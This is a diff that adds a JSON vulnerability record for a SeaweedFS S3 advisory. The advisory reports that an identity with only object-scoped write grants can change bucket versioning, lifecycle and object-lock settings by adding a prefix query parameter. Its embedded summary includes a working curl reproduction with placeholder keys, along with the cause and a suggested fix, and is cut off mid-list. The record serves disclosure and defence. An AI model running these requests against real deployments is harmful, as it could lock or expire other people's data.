@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-8rrx-349w-6396",
+  "aliases": [],
+  "title": "S3: object-scoped Write grant can change bucket configuration via the prefix query parameter",
+  "summary": "An S3 identity that is granted only object-scoped write access (for example `\"Write:cache/*\"`) can change bucket-level configuration by adding an unsigned-looking but signed `prefix` query parameter to a bucket subresource request. This crosses the boundary between object write access and bucket administration.\n\n**Affected versions**\n- Release 4.47 (image `chrislusf/seaweedfs:4.47`).\n- master at `be29f44d87448f88d842f6810a877421832dd81d` (image `chrislusf/seaweedfs:dev`, built 2026-09-26).\n\n**Deployment and configuration**\n- `weed server -s3 -s3.config=/etc/s3.json` with default settings; only the S3 API port (8333) is used.\n- SigV4 authentication with static identities from `s3.json`:\n  - `admin`: `[\"Admin\",\"Read\",\"Write\",\"List\",\"Tagging\"]`;\n  - `writer`: `[\"Read:cache\",\"Write:cache/*\",\"List:cache\"]`.\n\n**Attacker's starting position:** a valid S3 user (`writer`) whose grants are limited to objects in one bucket.\n\n**Trust boundary crossed:** object-scoped `Write:<bucket>/*` is treated as sufficient for bucket configuration subresources. A tenant who may only write objects can:\n- enable versioning;\n- replace lifecycle rules;\n- once versioning is on, set a bucket object-lock configuration, and object retention and legal hold.\n\nWith a COMPLIANCE lock and an attacker-chosen retention, the bucket's data can no longer be deleted by anyone, including the admin, until the retention expires. A lifecycle rule can expire data the tenant could not otherwise touch.\n\n**Reproduction** (curl 8.x, SigV4)\n```sh\nS=http://127.0.0.1:8333\nA=(--aws-sigv4 \"aws:amz:us-east-1:s3\" --user ADMINKEY0000000000:adminsecret0000000000000000000000000000)\nW=(--aws-sigv4 \"aws:amz:us-east-1:s3\" --user WRITERKEY000000000:writersecret000000000000000000000000000)\nV='<VersioningConfiguration xmlns=\"http://s3.amazonaws.com/doc/2006-03-01/\"><Status>Enabled</Status></VersioningConfiguration>'\ncurl -s -o /dev/null -w '%{http_code}\\n' \"${A[@]}\" -X PUT $S/cache\ncurl -s -o /dev/null -w '%{http_code}\\n' \"${W[@]}\" -X PUT --data-binary \"$V\" \"$S/cache?versioning\"            # 403, as expected\ncurl -s -o /dev/null -w '%{http_code}\\n' \"${W[@]}\" -X PUT --data-binary \"$V\" \"$S/cache?versioning&prefix=x\"   # 200\ncurl -s \"${A[@]}\" \"$S/cache?versioning\"                                                                        # <Status>Enabled</Status>\nL='<LifecycleConfiguration><Rule><ID>x</ID><Status>Enabled</Status><Filter><Prefix></Prefix></Filter><Expiration><Days>1</Days></Expiration></Rule></LifecycleConfiguration>'\ncurl -s -o /dev/null -w '%{http_code}\\n' \"${W[@]}\" -X PUT -H 'Content-Type: application/xml' --data-binary \"$L\" \"$S/cache?lifecycle&prefix=x\"  # 200\n```\nThe s3.json used:\n```json\n{\"identities\":[\n {\"name\":\"admin\",\"credentials\":[{\"accessKey\":\"ADMINKEY0000000000\",\"secretKey\":\"adminsecret0000000000000000000000000000\"}],\"actions\":[\"Admin\",\"Read\",\"Write\",\"List\",\"Tagging\"]},\n {\"name\":\"writer\",\"credentials\":[{\"accessKey\":\"WRITERKEY000000000\",\"secretKey\":\"writersecret000000000000000000000000000\"}],\"actions\":[\"Read:cache\",\"Write:cache/*\",\"List:cache\"]}\n]}\n```\n\n**Expected behaviour:** `PUT /cache?versioning&prefix=x` and `PUT /cache?lifecycle&prefix=x` return 403 for `writer`, as they do without `prefix`.\n\n**Actual behaviour:** both return 200 and change the bucket configuration.\n\n**Likely cause (4.47 source)**\n- `authRequestWithAuthType` promotes the `prefix` query parameter into the object key for every action. `Write:cache/*` then matches `Write:cache/x`.\n- The IAM-policy path has the same issue: `resolveFromQueryParameters` maps bucket subresources to their bucket action only when the request has no object. After promotion, `PUT ?versioning&prefix=x` resolves to `s3:PutObject`, so attached IAM policies do not contain it either.\n\n**Suggested fix:** restrict the `prefix` promotion to list actions (`ACTION_LIST`), so bucket subresource requests are always authorized as their bucket-level action.\n\n**Reachable subresources for an object-only writer** (observed): `versioning`, `li...",
+  "published_at": "2026-11-09T19:52:47.000Z",
+  "modified_at": "2026-11-09T19:52:47.000Z",
+  "severity": {
+    "level": "medium",
+    "score": null,
+    "vector": null,
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-863"
+  ],
+  "affected": [
+    {
+      "product": "seaweedfs",
+      "ranges": [
+        {
+          "introduced": "0",
+          "last_affected": "4.47"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-8rrx-349w-6396",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-8rrx-349w-6396",
+      "url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-8rrx-349w-6396",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:f8afcc67b2b40481791a87fd3a8c5a552cdb26e136fb0a4fc3f1355db6b1910d",
+  "note": null
+}
